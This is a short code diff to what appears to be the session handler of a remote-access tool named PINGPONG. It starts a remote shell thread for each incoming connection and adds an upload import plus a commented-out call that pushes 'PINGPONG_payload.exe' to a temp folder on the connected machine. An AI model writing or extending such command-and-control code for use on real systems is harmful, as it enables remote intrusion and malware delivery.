@@ -45,8 +45,10 @@ def startserver(ip, port, printf, open_ac):
         except KeyboardInterrupt:
             print("handler>[*]Stoping......")
             main.startserver()
+        import PINGPONG_script.upload
         _ip = addr[0]
         _port = addr[1]
+        # PINGPONG_script.upload.Upload(_ip, "./payload/upload_payload/PINGPONG_payload.exe", "D:/TEMP", False, False, conn, "")
         if printf:
             print('handler>[+]PINGPONG session Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
         t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
